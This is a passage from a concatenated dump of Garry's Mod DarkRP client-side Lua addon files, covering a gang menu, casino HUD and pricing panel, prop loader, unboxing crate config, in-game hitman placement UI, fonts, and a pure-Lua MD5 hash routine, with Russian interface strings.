        draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )

        if( searchBar:IsEditing() ) then
            Alpha = math.Clamp( Alpha+5, 0, 100 )
            Alpha2 = math.Clamp( Alpha2+20, 20, 255 )
        else
            Alpha = math.Clamp( Alpha-5, 0, 100 )
            Alpha2 = math.Clamp( Alpha2-20, 20, 255 )
        end
        
        draw.RoundedBox( 5, 0, 0, w, h, Color( color1.r, color1.g, color1.b, Alpha ) )
    
        surface.SetDrawColor( 255, 255, 255, Alpha2 )
        surface.SetMaterial(search)
        local size = 24
        surface.DrawTexturedRect( w-size-(h-size)/2, (h-size)/2, size, size )
    end
    
    searchBar = vgui.Create( "bricks_server_search", searchBarBack )
    searchBar:Dock( FILL )

    local scrollPanel = vgui.Create( "bricks_server_scrollpanel", self )
    scrollPanel:Dock( FILL )
    scrollPanel:DockMargin( 10, 0, 10, 10 )
    scrollPanel.Paint = function( self, w, h ) end 

    local spacing = 5
    local gridWide = self.panelWide-20
    local slotsWide = 3
    local slotWide = (gridWide-((slotsWide-1)*spacing))/slotsWide
    local slotTall = 75

    local grid = vgui.Create( "DIconLayout", scrollPanel )
    grid:Dock( TOP )
    grid:SetTall( slotTall )
    grid:SetSpaceY( spacing )
    grid:SetSpaceX( spacing )

    local ownerMat = Material( "bricks_server/crown.png" )

    function self.RefreshPanel()
        grid:Clear()
        grid.slots = 0

        local showMembers = {}
        for k, v in pairs( gangTable.Members or {} ) do
            if( (searchBar:GetValue() != "" and not string.find( string.lower( v[1] ), string.lower( searchBar:GetValue() ) )) ) then
                continue
            end

            local memberPly = player.GetBySteamID( k )

            local sortValue = v[2]+((not IsValid( memberPly ) and 100) or 0)

            table.insert( showMembers, { sortValue, k } )
        end
        
        if( sortChoice and string.EndsWith( sortChoice, "high_to_low" ) ) then
            table.SortByMember( showMembers, 1, false )
        else
            table.SortByMember( showMembers, 1, true )
        end

        for k, v in pairs( showMembers ) do
            local memberKey, memberTable = v[2], (gangTable.Members or {})[v[2]]

            grid.slots = (grid.slots or 0)+1
            local slots = grid.slots
            local slotsTall = math.ceil( slots/slotsWide )
            grid:SetTall( (slotsTall*slotTall)+((slotsTall-1)*spacing) ) 

            BRICKS_SERVER.Func.GangCreateMemberSlot( grid, slotWide, slotTall, memberKey, memberTable[1], memberTable[2], gangTable )
        end
    end
    self.RefreshPanel()

    searchBar.OnChange = function()
        self.RefreshPanel()
    end
end

function PANEL:Paint( w, h )

end

vgui.Register( "bricks_server_gangmenu_members", PANEL, "DPanel" )
--PATH addons/casino/lua/autorun/client/cl_casino.lua:
surface.CreateFont('rp.GamblingMachines', {
	font = 'Montserrat Medium',
	size = 90,
	weight = 500,
	shadow = true,
	antialias = true,
})

surface.CreateFont('3d2d',{font = 'roboto',size = 130,weight = 1700,shadow = true, antialias = true})

local fr
net('rp.CasinoOwner',function()
	local ent = net.ReadEntity()
	if (IsValid(fr)) then fr:Remove() end

	local w, h = 320, 160
	fr = ui.Create('ui_frame', function(self)
		self:SetTitle(ent.PrintName)
		self:SetSize(w, h)
		self:Center()
		self:MakePopup()
		self.Think = function()
			if (not IsValid(ent)) or (ent:GetPos():Distance(LocalPlayer():GetPos()) >= 80) then
				fr:Close()
			end
		end
	end)

	local x, y = fr:GetDockPos()

	ui.Create('rp_entity_priceset', function(self, p)
		self:SetEntity(ent)
		self:SetPos(p:GetDockPos())
		self:SetWide(w - 10)
	end, fr)

	local btnDisable = ui.Create('DButton', function(self, p)
		self:SetPos(x, y + 89)
		self:SetSize(w - 10, 30)
		self.Think = function()
			if (not IsValid(ent)) then return end

			if (ent:GetInService()) then
				self:SetText('Выключить')
			else
				self:SetText('Включить')
			end
		end
		self.DoClick = function()
			RunConsoleCommand("setmachineservice")
		end
	end, fr)
end)

local PANEL = {}

function PANEL:Init()
	self.Label = ui.Create('DLabel', function(self, p)
		self:SetFont('ui.18')
		self:SetColor(ui.col.ButtonText)
		self:SetText('Цена: ')
	end, self)
	self.PriceInput = ui.Create('DTextEntry', self)
	self.SetPrice = ui.Create('DButton', self)
	self.SetPrice:SetText('Установить цену')
	self.SetPrice.Think = function(s)
		if (not IsValid(self.Entity)) then return end
		local value = tonumber(self.PriceInput:GetValue())
		if (value == nil) then
			s:SetDisabled(true)
			s:SetText('Неверная цена!')
		elseif (value < self.Entity.MinPrice) then
			s:SetDisabled(true)
			s:SetText('Слишком низкая цена')
		elseif (value > self.Entity.MaxPrice) then
			s:SetDisabled(true)
			s:SetText('Слишком высокая цена')
		elseif (self.Entity:Getprice() == value) then
			s:SetDisabled(true)
			s:SetText('Выберите новую цену')
		else
			s:SetDisabled(false)
			s:SetText('Установить цену')
		end
	end
	self.SetPrice.DoClick = function()
		RunConsoleCommand('say','/setprice ' .. self.PriceInput:GetValue())
	end

	self:SetTall(85)
end

function PANEL:PerformLayout(w, h)
	self.Label:SetPos(0, 0)
	self.Label:SizeToContents()

	self.PriceInput:SetPos(0, 20)
	self.PriceInput:SetSize(w, 30)

	self.SetPrice:SetPos(0, 55)
	self.SetPrice:SetSize(w, 30)
end

function PANEL:Paint()
end

function PANEL:SetEntity(ent)
	self.Entity = ent
	self.PriceInput:SetText(ent:Getprice())
end

vgui.Register('rp_entity_priceset', PANEL, 'Panel')


--[[-------------------------------------------------------------------------
HUD
---------------------------------------------------------------------------]]

local ColValues = {}
local function varcol(name, val)
	if ColValues[name] == nil then
		ColValues[name] = {}
		ColValues[name].Old = val
		ColValues[name].Flash = SysTime()
		return Color(255,255,255)
	end

	if ColValues[name].Old != val then
		ColValues[name].Flash = SysTime() + 0.2
		ColValues[name].Old = val
		return Color(51,128,255)
	end

	if ColValues[name].Flash > SysTime() then
		return Color(51,128,255)
	end
	return Color(255,255,255)
end

local function mat(texture)
	return Material(texture, 'smooth')
end

local material_money 	= mat 'gambitrp/hud/moneydollar.png'

local gamblingProfit, gamblingLoss = 0, 0

net.Receive('rp.gambling.Profit', function()
	gamblingProfit = gamblingProfit + net.ReadUInt(32)
end)

net.Receive('rp.gambling.Loss', function()
	gamblingLoss = gamblingLoss + net.ReadUInt(32)
end)

surface.CreateFont('HudFont', {
	font = 'Tahoma',
	size = 22,
	weight = 350
})

surface.CreateFont('HudFontLaws', {
	font = 'Tahoma',
	size = 22,
	weight = 350
})

hook.Add("HUDPaint", "rp.CasinoHud", function()
	if LocalPlayer():Team() == TEAM_BUIS then
        local x, y    = 5, 10
        local w = math.max((ScrW() * .1), 250)
        local h = 45 + 37

        draw.OutlinedBox(x, y, w, h, Color(0,0,0,230), Color(245,245,245))

		surface.DrawOutlinedRect(x, y, 30, 30)
		surface.DrawOutlinedRect(x + 29, y, w - 29, 30)

		surface.SetDrawColor(255, 255, 255)
		surface.SetMaterial(material_money)
		surface.DrawTexturedRect(x + 1, y + 1, 28, 28)

		surface.SetDrawColor(Color(135, 135, 31, 60))
		surface.DrawRect(x + 30, y + 1, w - 31, 28)
		surface.SetFont('HudFont')
        
        surface.SetTextColor(255,255,255)
        surface.SetTextPos(x + 34, y + 4)
        surface.DrawText('Казино Прибыль/Убыток')
        y = y + 29
        
		surface.SetFont('HudFontLaws')
		local textX, textY = (x + 3), y
		surface.SetTextPos(textX, y)
		surface.SetTextColor(varcol('gambleprofit', gamblingProfit))
		surface.DrawText('Прибыль: ' .. DarkRP.formatMoney(gamblingProfit))
		y = y + 15
		
		surface.SetTextPos(textX, y)
		surface.SetTextColor(varcol('gambleloss', gamblingLoss))
		surface.DrawText('Убыток: ' .. DarkRP.formatMoney(gamblingLoss))
		y = y + 15
		
		local totalProfit = gamblingProfit - gamblingLoss
		surface.SetTextPos(textX, y)
		surface.SetTextColor(varcol('gambletotalprofit', totalProfit))
		surface.DrawText('Профит: ' .. DarkRP.formatMoney(totalProfit))
		y = y + 15
	end
end)
--PATH addons/perma/lua/autorun/client/cl_permaload.lua:
/*
   ____          _          _   ____          __  __       _ _                     
  / ___|___   __| | ___  __| | | __ ) _   _  |  \/  | __ _| | |__   ___  _ __ ___  
 | |   / _ \ / _` |/ _ \/ _` | |  _ \| | | | | |\/| |/ _` | | '_ \ / _ \| '__/ _ \ 
 | |__| (_) | (_| |  __/ (_| | | |_) | |_| | | |  | | (_| | | |_) | (_) | | | (_) |
  \____\___/ \__,_|\___|\__,_| |____/ \__, | |_|  |_|\__,_|_|_.__/ \___/|_|  \___/ 
                                      |___/                                        
*/

if not PermaProps then PermaProps = {} end

print("---------------------------------")
print("| Loading ClientSide PermaProps |")
print("---------------------------------")

for k, v in pairs(file.Find("permaprops/cl_*.lua", "LUA")) do
	
	include("permaprops/".. v)
	print("permaprops/".. v)


end

print("---------------------------------")
print("| Loading Shared PermaProps |")
print("---------------------------------")

for k, v in pairs(file.Find("permaprops/sh_*.lua", "LUA")) do
	
	include("permaprops/".. v)
	print("permaprops/".. v)


end

print("---------------------------------")
--PATH addons/unbox/lua/uc2_subconfig.lua:
--DO NOT EDIT THIS!
--DO NOT EDIT THIS!
BUC2 = BUC2 or {}
BUC2.ITEMS = {}
BUC2.ItemToID = {}
BUC2.IDToItem = {}
BUC2.UpgradeToItems = {}
BUC2.UpgradeFromItems = {}
BUC2.History = BUC2.History or {}

function bu_addCrate(id, name1, name2, price, c)
    BUC2.ItemToID[name1] = id
    BUC2.IDToItem[id] = name1

    BUC2.ITEMS[name1] = {
        items = {},
        color = c or Color(55, 55, 55),
        canDrop = false,
        name1 = name1,
        name2 = name2,
        itemType = "Crate",
        canBuy = true,
        price = price
    }
end

function bu_addWeapon(id, name1, name2, weaponName, crateName, chance, c)
    BUC2.ItemToID[name1] = id
    BUC2.IDToItem[id] = name1

    if BUC2.ITEMS[crateName] ~= nil then
        local weaponmodel = weapons.Get(weaponName) and weapons.Get(weaponName).WorldModel or "models/error.mdl"
        
        BUC2.ITEMS[name1] = {
            name1 = name1,
            name2 = name2,
            itemType = "Weapon",
            model = weaponmodel,
            chance = chance,
            color = c or Color(55, 55, 55),
            canBuy = false,
            weaponName = weaponName
        }

        table.insert(BUC2.ITEMS[crateName].items, name1)
    else
        print("[UNBOXING ERROR] THE CRATE '" .. crateName .. "' FOR '" .. name1 .. "' DOES NOT EXTIST.")
    end
end

function bu_addMoney(id, name1, name2, amount, crateName, chance, c, donate)
    BUC2.ItemToID[name1] = id
    BUC2.IDToItem[id] = name1

    if BUC2.ITEMS[crateName] ~= nil then
        BUC2.ITEMS[name1] = {
            name1 = name1,
            name2 = name2,
            itemType = "Money",
            amount = amount,
            chance = chance,
            color = c or Color(55, 55, 55),
            canBuy = false,
            donate = donate
        }

        table.insert(BUC2.ITEMS[crateName].items, name1)
    else
        print("[UNBOXING ERROR] THE CRATE '" .. crateName .. "' FOR '" .. name1 .. "' DOES NOT EXTIST.")
    end
end

function bu_addGroup(id, name1, name2, group, crateName, chance, c)
    BUC2.ItemToID[name1] = id
    BUC2.IDToItem[id] = name1

    if BUC2.ITEMS[crateName] ~= nil then
        BUC2.ITEMS[name1] = {
            name1 = name1,
            name2 = name2,
            itemType = "Group",
            amount = amount,
            chance = chance,
            color = c or Color(55, 55, 55),
            canBuy = false,
            group = group
        }

        table.insert(BUC2.ITEMS[crateName].items, name1)
    else
        print("[UNBOXING ERROR] THE CRATE '" .. crateName .. "' FOR '" .. name1 .. "' DOES NOT EXTIST.")
    end
end
--PATH addons/executioner/lua/autorun/client/executioner_placement.lua:
if not CLIENT then return end

surface.CreateFont( "rHit.Font.Generic", { font = "BFHUD", size = 30, weight = 700 } )
surface.CreateFont( "rHit.Font.Medium", { font = "Calibri", size = 27, weight = 700 } )
surface.CreateFont( "rHit.Font.Small", { font = "Calibri", size = 21, weight = 700 } )
surface.CreateFont( "rHit.Font.Inbetween", { font = "Calibri", size = 24, weight = 700 } )
surface.CreateFont( "rHit.Font.Other", { font = "BFHUD", size = 23, weight = 700 } )

surface.CreateFont( "EVSDDB20", { font = "VK Sans Display DemiBold", size = height(20), weight = 500 } )
surface.CreateFont( "EVSDDB16", { font = "VK Sans Display DemiBold", size = height(16), weight = 500 } )
surface.CreateFont( "EVSDM20", { font = "VK Sans Display Medium", size = height(20), weight = 500 } )
surface.CreateFont( "EVSDM16", { font = "VK Sans Display Medium", size = height(16), weight = 500 } )
surface.CreateFont( "EVSDM18", { font = "VK Sans Display Medium", size = height(18), weight = 500 } )

-- surface.CreateFont( "rHit.Font.Generic", { font = "BFHUD", size = 30, weight = 700 } )
-- surface.CreateFont( "rHit.Font.Generic", { font = "BFHUD", size = 30, weight = 700 } )


Executioner.emoteTable = { 'pose_standing_01', 'pose_standing_02', 'pose_standing_03', 'pose_standing_04' }
Executioner.materials = {  [ 'oink' ] = 'oink.png' } -- :D

local function CreateTextEntry( dock, x, y, w, h, txt, font, numeric )
    local object = vgui.Create( 'DTextEntry', dock )
    object:SetSize( w, h )
    object:SetPos( x, y )
    object:SetText( txt )
    object:SetFont( font )
    object:SetNumeric( numeric )
    object:SetVisible( false )
    object:SetDrawLanguageID(false)
    local base = baseclass.Get( 'DTextEntry' )
    object.Paint = function( me, w, h )
        draw.RoundedBox(10,0,0,w,h,Color(38,38,38))
        me:DrawTextEntryText( Executioner.Config.Component_Colors[ 'hit_price_entry' ].text, Color( 28, 28, 28 ), Color( 255, 255, 255 ) )
    end
    return object
end

local function ShowComponents( component_tree )
    for x = 1, #component_tree do
        if IsValid( component_tree[ x ] ) then component_tree[ x ]:SetVisible( true ) end
    end
end

function Executioner.RenderDisplay( parent, w, h, selection, y )
    local bar_width = w - 64
    if not y then y = 0 end
end

local function CreatePanelReplica( parent, default_paint, side, scroll, func )
    local static_gap, player_pane = 10
    local base_canvis = vgui.Create( 'DPanel', parent )
    base_canvis:SetSize( weight(282),height(344) )
    base_canvis:SetPos( weight(459), height(44) )
    base_canvis.Paint = function( me, w, h )
        draw.RoundedBox(10,0,0,w,h,Color(38,38,38))
    end

    if side == 1 then
        local base_canvis = vgui.Create( 'DPanel', parent )
        base_canvis:SetSize( weight(429),height(487) )
        base_canvis:SetPos( weight(12),height(44) )
        base_canvis.Paint = function( me, w, h )
            draw.RoundedBox(10,0,0,w,h,Color(38,38,38))
        end
        if scroll then
            player_pane = vgui.Create( 'DPanelList', base_canvis )
            player_pane:SetSize( base_canvis:GetWide() - weight(20), base_canvis:GetTall()-height(20) )
            player_pane:SetPos( weight(10), height(10))
            player_pane:SetSpacing( 1 )
            player_pane:EnableVerticalScrollbar( scroll )
            Graphics.PaintBar( player_pane, Color( 30, 30, 30, 220 ), Color( 28, 28, 28 ), Color( 26, 26, 26 ) )
        end
    end
    return base_canvis, player_pane
end

function Executioner.DeployPlacer()
    local self = LocalPlayer()
    local frame = vgui.Create( 'base_panel' )
    frame:SetSize( weight(753), height(541) )
    frame:SetDraggable( false )
    frame:SetPos( ( ScrW() / 2 - frame:GetWide() / 2 ) + frame:GetWide(), ( ScrH() / 2 - frame:GetTall() / 2 ) )
    frame:MoveTo( ScrW() / 2 - frame:GetWide() / 2, ScrH() / 2 - frame:GetTall() / 2, 0.2, 0, 1 )
    frame:Deploy( true )
    frame.Paint = function( me, w, h )
        draw.RoundedBox(10,0,0,w,h,Color(45,45,45))

        draw.SimpleText( Executioner.Config.Placement.Main_Title, 'EVSDDB20', weight(12), height(10) )
    end

    local player_canivs, player_pane = CreatePanelReplica( frame, true, 1, true )
    local data_canvis = CreatePanelReplica( frame, true, 2, false )
    player_canivs:SetDisabled( true )

    local hasSelection, current_selection, color_selection = false, nil, Executioner.Config.Placement.Row_Hovers.mainColor

    data_canvis.Paint = function( me, w, h )
        draw.RoundedBox(10,0,0,w,h,Color(38,38,38))
        if hasSelection and IsValid( current_selection ) then
            draw.SimpleText( current_selection:Nick(), 'EVSDM20', weight(13),height(8) )
            draw.SimpleText( team.GetName( current_selection:Team() ), 'EVSDM16', weight(13),height(30), team.GetColor( current_selection:Team() ) )
            Executioner.RenderDisplay( frame, w, h, current_selection )
        else
            Graphics.DrawText( Executioner.Config.Placement.No_Preview, 'rHit.Font.Generic', w / 2, 210, Executioner.Config.Placement.No_Preview_Color )
        end
    end

    local model_panel = vgui.Create( 'DModelPanel', data_canvis )
    model_panel:SetSize( weight(210), height(225) )
    model_panel:SetPos( weight(30), height(45) )
    model_panel:SetModel( current_selection and current_selection:GetModel() or '' )
    model_panel:SetAnimated( true )
    model_panel:SetVisible( false )
    model_panel.LayoutEntity = function() return end
    model_panel:SetCamPos( Vector( 50, 0, 60 ) )

    model_panel.Paint = function( me, w, h )
        baseclass.Get( 'DModelPanel' ).Paint( me, w, h )
    end

    local price_range = CreateTextEntry( frame, weight(459), height(400), weight(282),height(58), 'Введите сумму', 'EVSDDB16', true )
    price_range.OnMousePressed = function( me, w, h ) me:SetValue( '' ) end

    local request_hit = vgui.Create( 'DButton', frame )
    request_hit:SetSize( weight(282), height(58) )
    request_hit:SetPos( weight(459),height(471) )
    request_hit:SetText( Executioner.Config.Placement.Request_Hit )
    request_hit:SetFont( 'EVSDDB16' )
    request_hit:SetTextColor( Executioner.Config.Component_Colors[ 'button_request' ].text )
    request_hit:SetVisible( false )

    request_hit.Paint = function( me, w, h )
        draw.RoundedBox(10,0,0,w,h,Color(1,116,222))
    end

    request_hit.DoClick = function( me )
        local conversion = tonumber( price_range:GetValue() )
        if not isnumber( conversion ) or conversion <= 0 or conversion > Executioner.Config.Max_Hit_Price or conversion < Executioner.Config.Min_Hit_Price then Executioner.UnPackMessage( string.format( Executioner.Language.HitPriceFormatError, DarkRP.formatMoney( Executioner.Config.Max_Hit_Price ), DarkRP.formatMoney( Executioner.Config.Min_Hit_Price ) ) ) frame:Close() return end
        if not self:canAfford( conversion ) then
            Executioner.UnPackMessage( string.format( Executioner.Language.HitPriceCantAfford, DarkRP.formatMoney( conversion ), DarkRP.formatMoney( self:getDarkRPVar( 'money' ) ) ) )
            frame:Close()
            return
        end
        net.Start( 'rHit.Confirm.Placement' )
            net.WriteInt( conversion, 32 )
            net.WriteEntity( current_selection )
        net.SendToServer()
        frame:Close()
    end

    local objects, locked, choice, emote = {}, false, nil, nil

    local targets = {}
    -- This stops the rows being fucked up colors. If someone is hidden and we continue, k's value remains the same even though we can't see specific rows.
    -- This way we don't need to continue in the player.GetAll() loop when creating the panels
    -- So the color will always retain the correct color as only those who are valid we be in the loop.
    for k, v in player.Iterator() do
        if v ~= self and v:Alive() and not v:isArrested() and not v:GetNW2Bool( 'rHit_ActiveHit' ) and not Executioner.Config.Hitman_Teams[ team.GetName( v:Team() ) ] then
            if not Executioner.Config.Banned_Groups[ v:GetUserGroup() ] and not Executioner.Config.BlackList_Teams[ team.GetName( v:Team() ) ] then
                table.insert( targets, v )
            end
        end
    end

    for k, v in pairs( targets ) do
        local player_index = vgui.Create( 'DPanel', player_pane )
        player_index:SetSize( weight(409), height(48) )
        player_index.Paint = function( me, w, h )
            local name, group = IsValid( v ) and v:Nick() or 'Отключен', Executioner.Config.Clean_Ranks[ v:GetUserGroup() ] or 'User' -- CHANGE
            draw.RoundedBox(10,0,0,w,h,Color(35,35,35))
            draw.SimpleText( name, 'EVSDM18', weight(53), h/2, Color(255,255,255), 0,1 )
            draw.SimpleText( team.GetName(v:Team()), 'EVSDM18', w-weight(6), h/2, Color(255,255,255), 2,1 )
            Graphics.DrawText( group, 'EVSDM18', 5, 21, Executioner.Config.GroupConfiguration[ v:GetUserGroup() ] or Executioner.Config.Name_Colors, TEXT_ALIGN_LEFT )
            if me.Selected then Graphics.DrawOutline( 0, 0, w, h, 2, Executioner.Config.Outline_Colors ) end
            draw.RoundedBox(4,weight(9),height(6),weight(36),height(36),Color(38,38,38))
        end
        player_index.OnCursorEntered = function( me, w, h )
            if locked then return end
            hasSelection, current_selection, emote = true, v, table.Random( Executioner.emoteTable )
            model_panel:SetModel( v:GetModel() )
            Graphics.PlaySequence( model_panel, emote )
            color_selection = k % 2 == 0 and Executioner.Config.Placement.Row_Hovers.onSecond or Executioner.Config.Placement.Row_Hovers.mainColor
            ShowComponents( { model_panel, price_range, request_hit } )
            Graphics.CreateIconObject( data_canvis, Executioner.materials[ 'heart' ], 30, 309, 32, 32, false )
            Graphics.CreateIconObject( data_canvis, Executioner.materials[ 'armor' ], 30, 337, 32, 32, false )
        end
        player_index.OnMousePressed = function( me, w, h )
            if not me.Selected and choice ~= k then
                for k, v in pairs( objects ) do
                    if IsValid( v ) then v.Selected, locked, choice = false, false, nil end
                end
                me.Selected, locked, choice = true, true, k
            elseif me.Selected and choice == k then
                    me.Selected, locked, choice = false, false, k
            elseif not me.Selected and choice == k then
                me.Selected, locked, choice = true, true, k
            end
            current_selection = v
            model_panel:SetModel( v:GetModel() )
            Graphics.PlaySequence( model_panel, emote )
        end

        local mdl = vgui.Create('SpawnIcon', player_index)
        mdl:SetSize(weight(32), height(32))
        mdl:SetPos(weight(14),height(10))
        mdl:SetModel(v:GetModel() or 'models/Items/item_item_crate.mdl')
        mdl:SetTooltip()
        mdl:SetDisabled(true)
        mdl:SetMouseInputEnabled(false)
        mdl.DoClick = function() return end

        player_pane:AddItem( player_index )
        table.insert( objects, player_index )
    end
    --> Issue with the panel being entered on start? No idea why, cursor doesn't even hit the panel. This is a small fix. <--
    timer.Simple( 0.3, function() if IsValid( player_canivs ) then player_canivs:SetDisabled( false ) end end )
end
net.Receive( 'rHit.Open.Placement', Executioner.DeployPlacer )

--PATH addons/111mod/lua/autorun/client/fonts.lua:
surface.CreateFont('3d2d', {
    font = 'PT Root UI Bold',
    size = 130,
    weight = 1700,
    antialias = true,
    extended = true
})

-- top font in the world
surface.CreateFont("Trebuchet22", {
    size = 22,
    weight = 500,
    antialias = true,
    shadow = false,
    font = "Sans"
})
--PATH addons/plib_v5/lua/plib/libraries/hash.lua:
if (SERVER) and file.Exists('lua/bin/gmsv_hash_' .. (system.IsWindows() and 'win32' or 'linux') .. '.dll', 'MOD') then -- Use gm_hash if we have it since it's a faster https://github.com/SuperiorServers/gm_hash
	_require 'hash'
	return
end

hash = {}

-- MD5 modified from https://github.com/kikito/md5.lua
do
	local char, byte, format, rep, sub = string.char, string.byte, string.format, string.rep, string.sub
	local bit_or, bit_and, bit_not, bit_xor, bit_rshift, bit_lshift = bit.bor, bit.band, bit.bnot, bit.bxor, bit.rshift, bit.lshift

	-- convert little-endian 32-bit int to a 4-char string
	local function lei2str(i)
	  local f=function (s) return char( bit_and( bit_rshift(i, s), 255)) end
	  return f(0)..f(8)..f(16)..f(24)
	end

	-- convert raw string to big-endian int
	local function str2bei(s)
	  local v=0
	  for i=1, #s do
	    v = v * 256 + byte(s, i)
	  end
	  return v
	end

	-- convert raw string to little-endian int
	local function str2lei(s)
	  local v=0
	  for i = #s,1,-1 do
	    v = v*256 + byte(s, i)
	  end
	  return v
	end

	-- cut up a string in little-endian ints of given size
	local function cut_le_str(s,...)
	  local o, r = 1, {}
	  local args = {...}
	  for i=1, #args do
	    table.insert(r, str2lei(sub(s, o, o + args[i] - 1)))
	    o = o + args[i]
	  end
	  return r
	end

	local swap = function (w) return str2bei(lei2str(w)) end

	-- An MD5 mplementation in Lua, requires bitlib (hacked to use LuaBit from above, ugh)
	-- 10/02/2001 jcw@equi4.com

	local CONSTS = {
	  0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
	  0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
	  0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
	  0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
	  0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
	  0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
	  0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
	  0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
	  0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
	  0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
	  0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
	  0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
	  0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
	  0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
	  0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
	  0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391,
	  0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
	}

	local f=function (x,y,z) return bit_or(bit_and(x,y),bit_and(-x-1,z)) end
	local g=function (x,y,z) return bit_or(bit_and(x,z),bit_and(y,-z-1)) end
	local h=function (x,y,z) return bit_xor(x,bit_xor(y,z)) end
	local i=function (x,y,z) return bit_xor(y,bit_or(x,-z-1)) end
	local z=function (f,a,b,c,d,x,s,ac)
	  a=bit_and(a+f(b,c,d)+x+ac,0xFFFFFFFF)
	  -- be *very* careful that left shift does not cause rounding!
	  return bit_or(bit_lshift(bit_and(a,bit_rshift(0xFFFFFFFF,s)),s),bit_rshift(a,32-s))+b
	end

	local function transform(A,B,C,D,X)
	  local a,b,c,d=A,B,C,D
	  local t=CONSTS

	  a=z(f,a,b,c,d,X[ 0], 7,t[ 1])
	  d=z(f,d,a,b,c,X[ 1],12,t[ 2])
	  c=z(f,c,d,a,b,X[ 2],17,t[ 3])
	  b=z(f,b,c,d,a,X[ 3],22,t[ 4])
	  a=z(f,a,b,c,d,X[ 4], 7,t[ 5])
	  d=z(f,d,a,b,c,X[ 5],12,t[ 6])
	  c=z(f,c,d,a,b,X[ 6],17,t[ 7])
	  b=z(f,b,c,d,a,X[ 7],22,t[ 8])
	  a=z(f,a,b,c,d,X[ 8], 7,t[ 9])
	  d=z(f,d,a,b,c,X[ 9],12,t[10])
	  c=z(f,c,d,a,b,X[10],17,t[11])
	  b=z(f,b,c,d,a,X[11],22,t[12])
	  a=z(f,a,b,c,d,X[12], 7,t[13])
	  d=z(f,d,a,b,c,X[13],12,t[14])
	  c=z(f,c,d,a,b,X[14],17,t[15])
	  b=z(f,b,c,d,a,X[15],22,t[16])

	  a=z(g,a,b,c,d,X[ 1], 5,t[17])
	  d=z(g,d,a,b,c,X[ 6], 9,t[18])
	  c=z(g,c,d,a,b,X[11],14,t[19])
	  b=z(g,b,c,d,a,X[ 0],20,t[20])
	  a=z(g,a,b,c,d,X[ 5], 5,t[21])
	  d=z(g,d,a,b,c,X[10], 9,t[22])
	  c=z(g,c,d,a,b,X[15],14,t[23])
	  b=z(g,b,c,d,a,X[ 4],20,t[24])
	  a=z(g,a,b,c,d,X[ 9], 5,t[25])
	  d=z(g,d,a,b,c,X[14], 9,t[26])
	  c=z(g,c,d,a,b,X[ 3],14,t[27])
	  b=z(g,b,c,d,a,X[ 8],20,t[28])
	  a=z(g,a,b,c,d,X[13], 5,t[29])
	  d=z(g,d,a,b,c,X[ 2], 9,t[30])
	  c=z(g,c,d,a,b,X[ 7],14,t[31])
	  b=z(g,b,c,d,a,X[12],20,t[32])

	  a=z(h,a,b,c,d,X[ 5], 4,t[33])
	  d=z(h,d,a,b,c,X[ 8],11,t[34])
	  c=z(h,c,d,a,b,X[11],16,t[35])
	  b=z(h,b,c,d,a,X[14],23,t[36])
	  a=z(h,a,b,c,d,X[ 1], 4,t[37])
	  d=z(h,d,a,b,c,X[ 4],11,t[38])
	  c=z(h,c,d,a,b,X[ 7],16,t[39])
	  b=z(h,b,c,d,a,X[10],23,t[40])
	  a=z(h,a,b,c,d,X[13], 4,t[41])
	  d=z(h,d,a,b,c,X[ 0],11,t[42])
	  c=z(h,c,d,a,b,X[ 3],16,t[43])
	  b=z(h,b,c,d,a,X[ 6],23,t[44])
	  a=z(h,a,b,c,d,X[ 9], 4,t[45])
	  d=z(h,d,a,b,c,X[12],11,t[46])
	  c=z(h,c,d,a,b,X[15],16,t[47])
	  b=z(h,b,c,d,a,X[ 2],23,t[48])

	  a=z(i,a,b,c,d,X[ 0], 6,t[49])
	  d=z(i,d,a,b,c,X[ 7],10,t[50])
	  c=z(i,c,d,a,b,X[14],15,t[51])
	  b=z(i,b,c,d,a,X[ 5],21,t[52])
	  a=z(i,a,b,c,d,X[12], 6,t[53])
	  d=z(i,d,a,b,c,X[ 3],10,t[54])
	  c=z(i,c,d,a,b,X[10],15,t[55])
	  b=z(i,b,c,d,a,X[ 1],21,t[56])
	  a=z(i,a,b,c,d,X[ 8], 6,t[57])
	  d=z(i,d,a,b,c,X[15],10,t[58])
	  c=z(i,c,d,a,b,X[ 6],15,t[59])
	  b=z(i,b,c,d,a,X[13],21,t[60])
	  a=z(i,a,b,c,d,X[ 4], 6,t[61])
	  d=z(i,d,a,b,c,X[11],10,t[62])
	  c=z(i,c,d,a,b,X[ 2],15,t[63])
	  b=z(i,b,c,d,a,X[ 9],21,t[64])

	  return A+a,B+b,C+c,D+d
	end

	function hash.MD5(s)
	  local msgLen = #s
	  local padLen = 56 - msgLen % 64

	  if msgLen % 64 > 56 then padLen = padLen + 64 end

	  if padLen == 0 then padLen = 64 end

	  s = s .. char(128) .. rep(char(0),padLen-1) .. lei2str(8*msgLen) .. lei2str(0)
	  local t = CONSTS
	  local a,b,c,d = t[65],t[66],t[67],t[68]

	  for i=1,#s,64 do
	    local X = cut_le_str(sub(s,i,i+63),4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4)
	    X[0] = table.remove(X,1) -- zero based!
	    a,b,c,d = transform(a,b,c,d,X)
	  end

	  return format("%08x%08x%08x%08x",swap(a),swap(b),swap(c),swap(d))
	end
end


-- SHA2 modified from http://lua-users.org/wiki/SecureHashAlgorithm
do
	local bit_band 		= bit.band
	local bit_ror     = bit.ror
	local bit_bxor 		= bit.bxor
